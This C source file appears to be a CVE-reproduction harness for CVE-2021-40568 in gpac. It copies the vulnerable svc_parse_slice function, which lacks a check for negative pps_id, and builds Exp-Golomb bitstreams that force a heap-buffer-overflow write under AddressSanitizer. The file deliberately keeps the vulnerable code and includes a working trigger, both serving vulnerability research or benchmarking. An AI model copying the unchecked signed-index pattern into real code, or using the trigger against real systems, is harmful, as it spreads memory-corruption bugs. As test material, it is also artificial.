/* cve_barebone direct-call harness for cve_20d8c4b3 (gpac)
 * CVE:              CVE-2021-40568
 * Fix commit:       f1ae01d745200a258cdf62622f71754c37cb6c30
 * Vulnerable rev:   04dbf08bff4d61948bab80c3f9096ecc60c7f302
 * Target:           svc_parse_slice  (src/media_tools/av_parsers.c)
 * Bug class:        missing lower-bound check on an Exp-Golomb-coded index ->
 *                   heap-buffer-overflow WRITE (CWE-787), determined empirically
 *                   from the ASAN report (see scripts/gen_dc_cve_20d8c4b3.py).
 *
 * svc_parse_slice reads pps_id as an Exp-Golomb ue(v) code straight off the
 * bitstream into a SIGNED s32:
 *     pps_id = gf_bs_read_ue_log(bs, "pps_id");
 *     if (pps_id > 255)
 *         return -1;
 *     si->pps = &avc->pps[pps_id];
 *     si->pps->id = pps_id;                 <-- OOB WRITE when pps_id < 0
 * gf_bs_read_ue_log_idx3 (av_parsers.c) can legitimately decode any value up to
 * 0xFFFFFFFE (a 63-bit code: 31 leading zero bits + a 32-bit suffix -- more than
 * 31 leading zeros is treated as a corrupted/truncated code and rejected: see
 * its own "nb_lead>=32" guard). Every value in [0x80000000, 0xFFFFFFFE]
 * therefore round-trips into pps_id as a NEGATIVE s32 once stored (universal
 * two's-complement reinterpretation on this target), and `pps_id > 255` is
 * false for every negative pps_id -- that's the ENTIRE guard the vulnerable
 * revision has. `avc->pps` is `AVC_PPS pps[255]` embedded inside `AVCState`,
 * well after a big `AVC_SPS sps[32]` array, so `si->pps->id = pps_id;` with a
 * controlled small negative pps_id lands just BEFORE the `AVCState` heap
 * allocation itself -- a clean, ASAN-classifiable heap-buffer-overflow, not a
 * wild far-away segfault. fix_commit f1ae01d7 adds the missing `(pps_id<0) ||`
 * half of the guard (`if ((pps_id<0) || (pps_id > 255)) return -1;`).
 *
 * This harness's Exp-Golomb DECODER (gf_bs_read_ue_log_idx3 + the *_log wrapper
 * macros, gf_bs_read_ue/gf_bs_read_se/gf_bs_read_se_log_idx2) is copied
 * VERBATIM from src/media_tools/av_parsers.c, selecting that file's own
 * "#else" (GPAC_DISABLE_AVPARSE_LOGS-equivalent) branch for the
 * gf_bs_log_idx/gf_bs_read_int_log family -- a real, already-existing code
 * path in the same file (debug logging compiled out), not an invented
 * shortcut; it does not alter svc_parse_slice's data flow at all. GF_BitStream
 * itself is opaque in real gpac (bitstream.c); reproduced here as a minimal
 * faithful MEM/READ-mode-only reader (gf_bs_new/BS_ReadByte/gf_bs_read_bit/
 * gf_bs_read_int/gf_bs_available), matching src/utils/bitstream.c's exact
 * MSB-first bit-packing algorithm -- FILE-backed streams, write modes, and the
 * emulation-prevention-byte / read-cache machinery are never used on this call
 * path and are omitted. AVC_SPS/AVC_PPS/AVCSliceInfo/AVCState are copied
 * verbatim (field-for-field, same order) from include/gpac/internal/
 * media_dev.h; AVCState omits the trailing sei/is_svc/last_nal_type_parsed/
 * last_ps_idx fields, which svc_parse_slice never references and which sit
 * AFTER pps[] so dropping them cannot change pps's offset within the struct.
 *
 * main() does NOT hand-craft the raw Exp-Golomb bit pattern for each corpus
 * file: it reads argv[1] into a heap buffer (ASAN-guarded), uses its first few
 * bytes to select slice_type (kept <=9, so the function's own early-exit
 * branch on slice_type is never what stops it) and a signed 32-bit "pps
 * request", then ENCODES that request into a real ue(v)-coded bitstream with a
 * small verbatim-algorithm Exp-Golomb bit WRITER (the exact inverse of
 * gf_bs_read_ue_log_idx3, vb_bs_put_ue below) before handing it to
 * svc_parse_slice through a real GF_BitStream over a second heap buffer. A
 * negative request is turned into a pps_id that lands a small, fixed number of
 * AVC_PPS elements before the AVCState allocation's start -- offsetof/sizeof
 * are computed BY THE COMPILER (offsetof(AVCState,pps), sizeof(AVC_PPS)), not
 * hand-counted -- comfortably inside ASAN's redzone for an allocation this
 * size (tens of KB), never a wild unmapped address. A non-negative request is
 * reduced mod 255 into an always-valid in-bounds index, which still exercises
 * svc_parse_slice's own pps write and then hits a clean, early `return -2;`
 * (`!si->pps->slice_group_count`, true because AVCState is zero-initialized)
 * with no OOB anywhere -- the SAFE bucket.
 *
 * Build (dc_batch/dc_try, in cvf-builder):
 *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 -fno-inline harness.c -lm
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>

/* ---- real gpac base typedefs (include/gpac/setup.h, verbatim, Linux/gcc branch) ---- */
typedef unsigned long long u64;
typedef long long s64;
typedef unsigned int u32;
typedef int s32;
typedef unsigned short u16;
typedef short s16;
typedef unsigned char u8;
typedef signed char s8;
typedef enum { GF_FALSE = 0, GF_TRUE } Bool;

/* ---- real constants svc_parse_slice's body references (include/gpac/internal/
 * media_dev.h, include/gpac/constants.h -- verbatim values) ---- */
#define GF_SVC_SSPS_ID_SHIFT	16
#define GF_AVC_NALU_IDR_SLICE 5

/* ---- GF_LOG: real gpac core logging macro (include/gpac/tools.h). Never
 * actually reached by any corpus input here (both the trigger and the safe
 * bucket resolve well before gf_bs_read_ue_log_idx3's own truncated-code
 * branch that calls it), so a no-op stub is a faithful "incidental" stand-in
 * -- it carries no data-flow signal, only a debug message. ---- */
#define GF_LOG(...) do {} while (0)
#define GF_LOG_ERROR 0
#define GF_LOG_CODING 0

/* ---- GF_BitStream: opaque in real gpac (src/utils/bitstream.c). Minimal
 * faithful MEM/GF_BITSTREAM_READ-mode-only reader reproducing struct
 * __tag_bitstream's exact bit-packing fields/algorithm (position in bytes +
 * current byte/nbBits cache); FILE mode, write modes, and the
 * emulation-prevention-byte / cache_read machinery are never exercised on
 * this call path and are omitted. ---- */
typedef struct __gf_bs_tag {
	const u8 *original;
	u64 size;
	u64 position;
	u32 current;
	u32 nbBits;
} GF_BitStream;

#define GF_BITSTREAM_READ 0

static GF_BitStream *gf_bs_new(const u8 *buffer, u64 size, u32 mode)
{
	GF_BitStream *bs = (GF_BitStream *) calloc(1, sizeof(GF_BitStream));
	if (!bs) return NULL;
	(void) mode; /* this harness only ever constructs GF_BITSTREAM_READ streams */
	bs->original = buffer;
	bs->size = size;
	bs->position = 0;
	bs->current = 0;
	bs->nbBits = 8;
	return bs;
}

/* verbatim algorithm from src/utils/bitstream.c's BS_ReadByte, GF_BITSTREAM_READ arm */
static u8 BS_ReadByte(GF_BitStream *bs)
{
	if (bs->position >= bs->size) return 0;
	return (u8) bs->original[bs->position++];
}

/* verbatim from src/utils/bitstream.c (NO_OPTS arm) */
static u8 gf_bs_read_bit(GF_BitStream *bs)
{
	if (bs->nbBits == 8) {
		bs->current = BS_ReadByte(bs);
		bs->nbBits = 0;
	}
	{
		s32 ret;
		bs->current <<= 1;
		bs->nbBits++;
		ret = (bs->current & 0x100) >> 8;
		return (u8) ret;
	}
}

/* verbatim from src/utils/bitstream.c (NO_OPTS arm) */
static u32 gf_bs_read_int(GF_BitStream *bs, u32 nBits)
{
	u32 ret;
	ret = 0;
	while (nBits-- > 0) {
		ret <<= 1;
		ret |= gf_bs_read_bit(bs);
	}
	return ret;
}

/* verbatim from src/utils/bitstream.c, GF_BITSTREAM_READ arm */
static u64 gf_bs_available(GF_BitStream *bs)
{
	if (bs->size < bs->position)
		return 0;
	else
		return (bs->size - bs->position);
}

/* ---- verbatim from src/media_tools/av_parsers.c, lines ~56-66: the
 * "#else" (GPAC_DISABLE_AVPARSE_LOGS-equivalent) branch of the file's own
 * local logging macros -- a real, already-existing code path in that file,
 * selected here because debug-only logging has no bearing on
 * svc_parse_slice's data flow. ---- */
#define gf_bs_log(_bs, _nBits, _fname, _val)
#define gf_bs_log_idx(_bs, _nBits, _fname, _val, _idx1, _idx2, _idx3)
#define gf_bs_read_int_log(_bs, _nbb, _f) gf_bs_read_int(_bs, _nbb)
#define gf_bs_read_int_log_idx(_bs, _nbb, _f, _idx) gf_bs_read_int(_bs, _nbb)
#define gf_bs_read_int_log_idx2(_bs, _nbb, _f, _idx1, _idx2) gf_bs_read_int(_bs, _nbb)
#define gf_bs_read_int_log_idx3(_bs, _nbb, _f, _idx1, _idx2, _idx3) gf_bs_read_int(_bs, _nbb)

/* ---- verbatim from src/media_tools/av_parsers.c: the Exp-Golomb readers
 * svc_parse_slice calls through (gf_bs_read_ue_log/gf_bs_read_se_log). This
 * is squarely ON the crash path -- pps_id is the direct return value of
 * gf_bs_read_ue_log_idx3. ---- */
u32 gf_bs_read_ue_log_idx3(GF_BitStream *bs, const char *fname, s32 idx1, s32 idx2, s32 idx3)
{
	u32 val=0, code;
	s32 nb_lead = -1;
	u32 bits = 0;
	for (code=0; !code; nb_lead++) {
		if (nb_lead>=32) {
			//gf_bs_read_int keeps returning 0 on EOS, so if no more bits available, rbsp was truncated otherwise code is broken in rbsp)
			//we only test once nb_lead>=32 to avoid testing at each bit read
			if (!gf_bs_available(bs)) {
				GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, ("[Core] exp-golomb read failed, not enough bits in bitstream !\n"));
			} else {
				GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, ("[Core] corrupted exp-golomb code, %d leading zeros, max 31 allowed !\n", nb_lead));
			}
			return 0;
		}

		code = gf_bs_read_int(bs, 1);
		bits++;
	}

	if (nb_lead) {
		u32 leads=1;
		val = gf_bs_read_int(bs, nb_lead);
		leads <<= nb_lead;
		leads -= 1;
		val += leads;
//		val += (1 << nb_lead) - 1;
		bits += nb_lead;
	}

	if (fname) {
		gf_bs_log_idx(bs, bits, fname, val, idx1, idx2, idx3);
	}
	return val;
}

#define gf_bs_read_ue_log_idx2(_bs, _fname, _idx1, _idx2) gf_bs_read_ue_log_idx3(_bs, _fname, (s32) _idx1, (s32) _idx2, -1)
#define gf_bs_read_ue_log_idx(_bs, _fname, _idx) gf_bs_read_ue_log_idx3(_bs, _fname, (s32) _idx, -1, -1)
#define gf_bs_read_ue_log(_bs, _fname) gf_bs_read_ue_log_idx3(_bs, _fname, -1, -1, -1)

u32 gf_bs_read_ue(GF_BitStream *bs)
{
	return gf_bs_read_ue_log(bs, NULL);
}

s32 gf_bs_read_se(GF_BitStream *bs)
{
	u32 v = gf_bs_read_ue(bs);
	if ((v & 0x1) == 0) return (s32)(0 - (v >> 1));
	return (v + 1) >> 1;
}

s32 gf_bs_read_se_log_idx2(GF_BitStream *bs, const char *fname, s32 idx1, s32 idx2)
{
	s32 res = gf_bs_read_se(bs);
	if (fname)
		gf_bs_log_idx(bs, -1, fname, res, idx1, idx2, -1);
	return res;
}
#define gf_bs_read_se_log_idx(_bs, _fname, _idx) gf_bs_read_se_log_idx2(_bs, _fname, (s32) _idx, -1)
#define gf_bs_read_se_log(_bs, _fname) gf_bs_read_se_log_idx2(_bs, _fname, -1, -1)

/* ---- real type definitions svc_parse_slice needs (include/gpac/internal/
 * media_dev.h, verbatim, field-for-field, same order) ---- */

typedef struct
{
	u8 cpb_removal_delay_length_minus1;
	u8 dpb_output_delay_length_minus1;
	u8 time_offset_length;
	/*to be eventually completed by other hrd members*/
} AVC_HRD;

typedef struct
{
	s32 timing_info_present_flag;
	u32 num_units_in_tick;
	u32 time_scale;
	s32 fixed_frame_rate_flag;

	Bool aspect_ratio_info_present_flag;
	u32 par_num, par_den;

	Bool overscan_info_present_flag;
	Bool video_signal_type_present_flag;
	u8 video_format;
	Bool video_full_range_flag;

	Bool colour_description_present_flag;
	u8 colour_primaries;
	u8 transfer_characteristics;
	u8 matrix_coefficients;

	Bool nal_hrd_parameters_present_flag;
	Bool vcl_hrd_parameters_present_flag;
	Bool low_delay_hrd_flag;
	AVC_HRD hrd;

	Bool pic_struct_present_flag;

	/*to be eventually completed by other vui members*/
} AVC_VUI;

typedef struct
{
	u32 left;
	u32 right;
	u32 top;
	u32 bottom;

} AVC_CROP;


typedef struct
{
	s32 profile_idc;
	s32 level_idc;
	s32 prof_compat;
	s32 log2_max_frame_num;
	u32 poc_type, poc_cycle_length;
	s32 log2_max_poc_lsb;
	s32 delta_pic_order_always_zero_flag;
	s32 offset_for_non_ref_pic, offset_for_top_to_bottom_field;
	Bool frame_mbs_only_flag;
	Bool mb_adaptive_frame_field_flag;
	u32 max_num_ref_frames;
	Bool gaps_in_frame_num_value_allowed_flag;
	u8 chroma_format;
	u8 luma_bit_depth_m8;
	u8 chroma_bit_depth_m8;
	u32 ChromaArrayType;

	s16 offset_for_ref_frame[256];

	u32 width, height;

	Bool vui_parameters_present_flag;
	AVC_VUI vui;
	AVC_CROP crop;

	/*used to discard repeated SPSs - 0: not parsed, 1 parsed, 2 sent*/
	u32 state;

	u32 sbusps_crc;

	/*for SVC stats during import*/
	u32 nb_ei, nb_ep, nb_eb;
} AVC_SPS;

typedef struct
{
	s32 id; /* used to compare pps when storing SVC PSS */
	s32 sps_id;
	Bool entropy_coding_mode_flag;
	s32 pic_order_present;			/* pic_order_present_flag*/
	s32 redundant_pic_cnt_present;	/* redundant_pic_cnt_present_flag */
	u32 slice_group_count;			/* num_slice_groups_minus1 + 1*/
	u32 mb_slice_group_map_type;
	u32 pic_size_in_map_units_minus1;
	u32 slice_group_change_rate_minus1;
	/*used to discard repeated SPSs - 0: not parsed, 1 parsed, 2 sent*/
	u32 status;
	Bool weighted_pred_flag;
	u8 weighted_bipred_idc;
	Bool deblocking_filter_control_present_flag;
	u32 num_ref_idx_l0_default_active_minus1, num_ref_idx_l1_default_active_minus1;
} AVC_PPS;

typedef struct
{
	s32 idr_pic_flag;
	u8 temporal_id, priority_id, dependency_id, quality_id;
} SVC_NALUHeader;

typedef struct
{
	u8 nal_ref_idc, nal_unit_type, field_pic_flag, bottom_field_flag;
	u32 frame_num, idr_pic_id, poc_lsb, slice_type;
	s32 delta_poc_bottom;
	s32 delta_poc[2];
	s32 redundant_pic_cnt;

	s32 poc;
	u32 poc_msb, poc_msb_prev, poc_lsb_prev, frame_num_prev;
	s32 frame_num_offset, frame_num_offset_prev;

	AVC_SPS *sps;
	AVC_PPS *pps;
	SVC_NALUHeader NalHeader;
} AVCSliceInfo;

/* AVCState, trimmed: the real struct also has, AFTER pps[], `AVCSliceInfo
 * s_info; AVCSei sei; Bool is_svc; u8 last_nal_type_parsed; s8 last_ps_idx;`.
 * svc_parse_slice never references avc->s_info/avc->sei/avc->is_svc/
 * avc->last_nal_type_parsed/avc->last_ps_idx (si is passed in separately),
 * and none of those trailing fields can move pps's offset, so they are
 * omitted rather than pulling in the unrelated SEI struct family. */
typedef struct
{
	AVC_SPS sps[32]; /* range allowed in the spec is 0..31 */
	s8 sps_active_idx, pps_active_idx;	/*currently active sps; must be initalized to -1 in order to discard not yet decodable SEIs*/

	AVC_PPS pps[255];
} AVCState;

/* ==== VERBATIM from data_cve/cve_20d8c4b3/target/original_function.c ==== */
static s32 svc_parse_slice(GF_BitStream *bs, AVCState *avc, AVCSliceInfo *si)
{
	s32 pps_id;

	/*s->current_picture.reference= h->nal_ref_idc != 0;*/
	gf_bs_read_ue_log(bs, "first_mb_in_slice");
	si->slice_type = gf_bs_read_ue_log(bs, "slice_type");
	if (si->slice_type > 9) return -1;

	pps_id = gf_bs_read_ue_log(bs, "pps_id");
	if (pps_id > 255)
		return -1;
	si->pps = &avc->pps[pps_id];
	si->pps->id = pps_id;
	if (!si->pps->slice_group_count)
		return -2;
	si->sps = &avc->sps[si->pps->sps_id + GF_SVC_SSPS_ID_SHIFT];
	if (!si->sps->log2_max_frame_num)
		return -2;

	si->frame_num = gf_bs_read_int_log(bs, si->sps->log2_max_frame_num, "frame_num");

	si->field_pic_flag = 0;
	if (si->sps->frame_mbs_only_flag) {
		/*s->picture_structure= PICT_FRAME;*/
	}
	else {
		si->field_pic_flag = gf_bs_read_int_log(bs, 1, "field_pic_flag");
		if (si->field_pic_flag) si->bottom_field_flag = gf_bs_read_int_log(bs, 1, "bottom_field_flag");
	}
	if (si->nal_unit_type == GF_AVC_NALU_IDR_SLICE || si->NalHeader.idr_pic_flag)
		si->idr_pic_id = gf_bs_read_ue_log(bs, "idr_pic_id");

	if (si->sps->poc_type == 0) {
		si->poc_lsb = gf_bs_read_int_log(bs, si->sps->log2_max_poc_lsb, "poc_lsb");
		if (si->pps->pic_order_present && !si->field_pic_flag) {
			si->delta_poc_bottom = gf_bs_read_se_log(bs, "delta_poc_bottom");
		}
	}
	else if ((si->sps->poc_type == 1) && !si->sps->delta_pic_order_always_zero_flag) {
		si->delta_poc[0] = gf_bs_read_se_log(bs, "delta_poc0");
		if ((si->pps->pic_order_present == 1) && !si->field_pic_flag)
			si->delta_poc[1] = gf_bs_read_se_log(bs, "delta_poc1");
	}
	if (si->pps->redundant_pic_cnt_present) {
		si->redundant_pic_cnt = gf_bs_read_ue_log(bs, "redundant_pic_cnt");
	}
	return 0;
}
/* ==== end verbatim ==== */

/* ==================== harness-local Exp-Golomb bit WRITER ====================
 * The exact inverse of gf_bs_read_ue_log_idx3 above: MSB-first bit packing,
 * `nbits` = bit-length of (v+1), `lead` = nbits-1 leading zero bits, then the
 * (v+1) bits themselves (whose own leading '1' bit doubles as ue(v)'s stop
 * bit). Every u32 in [0, 0xFFFFFFFE] round-trips through
 * gf_bs_read_ue_log_idx3 -- 0xFFFFFFFF is the one value that can't (it would
 * need 32 leading zero bits, which the decoder's own "nb_lead>=32" guard
 * rejects as a corrupted/truncated code), and this writer is never asked for
 * it (see vb_make_bs below). */

static u32 vb_bitlen32(u32 v)
{
	u32 n = 0;
	while (n < 32 && (v >> n)) n++;
	return n;
}

static void vb_bs_put_bit(u8 *buf, u32 *bitpos, u32 bit)
{
	u32 byte_idx = *bitpos >> 3;
	u32 bit_idx = 7 - (*bitpos & 7);
	if (bit) buf[byte_idx] = (u8)(buf[byte_idx] | (1u << bit_idx));
	(*bitpos)++;
}

static void vb_bs_put_bits(u8 *buf, u32 *bitpos, u32 val, u32 nbits)
{
	s32 i;
	for (i = (s32) nbits - 1; i >= 0; i--) {
		vb_bs_put_bit(buf, bitpos, (val >> i) & 1u);
	}
}

static void vb_bs_put_ue(u8 *buf, u32 *bitpos, u32 v)
{
	u32 tmp = v + 1;
	u32 nbits = vb_bitlen32(tmp);
	u32 lead = nbits - 1;
	u32 i;
	for (i = 0; i < lead; i++) vb_bs_put_bit(buf, bitpos, 0);
	vb_bs_put_bits(buf, bitpos, tmp, nbits);
}

/* Encode (first_mb_in_slice=0, slice_type, pps_id_u32) as three consecutive
 * ue(v) codes into a fresh heap buffer, and wrap that buffer in a real
 * GF_BitStream. *out_bs and *out_buf are both caller-owned (freed in main). */
static void vb_make_bs(u32 slice_type, u32 pps_id_u32, GF_BitStream **out_bs, u8 **out_buf)
{
	u8 tmpbuf[16];
	u32 bitpos = 0;
	u32 nbytes;
	u8 *heapbuf;

	memset(tmpbuf, 0, sizeof(tmpbuf));
	vb_bs_put_ue(tmpbuf, &bitpos, 0);            /* first_mb_in_slice */
	vb_bs_put_ue(tmpbuf, &bitpos, slice_type);   /* slice_type, always <=9 */
	vb_bs_put_ue(tmpbuf, &bitpos, pps_id_u32);   /* pps_id (possibly OOB-encoded) */

	nbytes = (bitpos + 7) / 8;
	heapbuf = (u8 *) malloc(nbytes > 0 ? nbytes : 1);
	if (!heapbuf) { *out_bs = NULL; *out_buf = NULL; return; }
	memcpy(heapbuf, tmpbuf, nbytes);

	*out_buf = heapbuf;
	*out_bs = gf_bs_new(heapbuf, nbytes, GF_BITSTREAM_READ);
}

/* ==================== harness main ==================== */

int main(int argc, char **argv)
{
	FILE *f;
	long fsz;
	u8 *fbuf;
	size_t rd;
	u8 b0, b1, b2, b3, b4;
	u32 raw_pps, slice_type_val;
	s32 raw_s, pps_id_target;

	AVCState *avc;
	AVCSliceInfo *si;
	GF_BitStream *bs;
	u8 *bsbuf;
	s32 ret;

	if (argc < 2) return 0;
	f = fopen(argv[1], "rb");
	if (!f) return 0;
	if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
	fsz = ftell(f);
	if (fsz < 0) fsz = 0;
	if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }

	/* HEAP-allocate the raw input (ASAN-guarded); its bytes only ever
	 * SELECT/SEED the svc_parse_slice() arguments constructed below. */
	fbuf = (u8 *) malloc((size_t) fsz + 1);
	if (!fbuf) { fclose(f); return 0; }
	rd = (fsz > 0) ? fread(fbuf, 1, (size_t) fsz, f) : 0;
	fclose(f);
	(void) rd;

	b0 = (fsz > 0) ? fbuf[0] : 0;
	b1 = (fsz > 1) ? fbuf[1] : 0x11;
	b2 = (fsz > 2) ? fbuf[2] : 0x22;
	b3 = (fsz > 3) ? fbuf[3] : 0x33;
	b4 = (fsz > 4) ? fbuf[4] : 0x44;
	free(fbuf);

	raw_pps = ((u32) b1 << 24) | ((u32) b2 << 16) | ((u32) b3 << 8) | (u32) b4;
	slice_type_val = b0 % 10;   /* always <=9: keeps flow on the pps_id logic,
	                               never the function's own slice_type>9 exit */

	raw_s = (s32) raw_pps;
	if (raw_s < 0) {
		/* TRIGGER: derive a pps_id that lands a small, FIXED number of
		 * AVC_PPS elements before AVCState's own allocation start. The
		 * exact OOB target does not depend on the specific negative value
		 * of raw_pps (only its sign selects this branch) -- every
		 * triggering input reaches the identical, reproducible
		 * heap-buffer-overflow WRITE at `si->pps->id = pps_id;`. */
		long pps_elem_offset = (long) (offsetof(AVCState, pps) / sizeof(AVC_PPS));
		long margin = 3; /* elements strictly before AVCState's start */
		pps_id_target = -(s32) (pps_elem_offset + margin);
	} else {
		/* SAFE: always a valid pps[] index (0..254). svc_parse_slice still
		 * writes si->pps->id = pps_id (in bounds) then hits a clean early
		 * `return -2;` (`!si->pps->slice_group_count`, AVCState is
		 * zero-initialized) -- no OOB anywhere. */
		pps_id_target = (s32) (raw_pps % 255);
	}

	vb_make_bs(slice_type_val, (u32) pps_id_target, &bs, &bsbuf);
	if (!bs) return 0;

	avc = (AVCState *) calloc(1, sizeof(AVCState));
	si = (AVCSliceInfo *) calloc(1, sizeof(AVCSliceInfo));
	if (!avc || !si) { free(bs); free(bsbuf); free(avc); free(si); return 0; }

	ret = svc_parse_slice(bs, avc, si);   /* expected to abort inside here (ASAN) on TRIGGER */
	(void) ret;

	free(bs);
	free(bsbuf);
	free(avc);
	free(si);
	return 0;
}
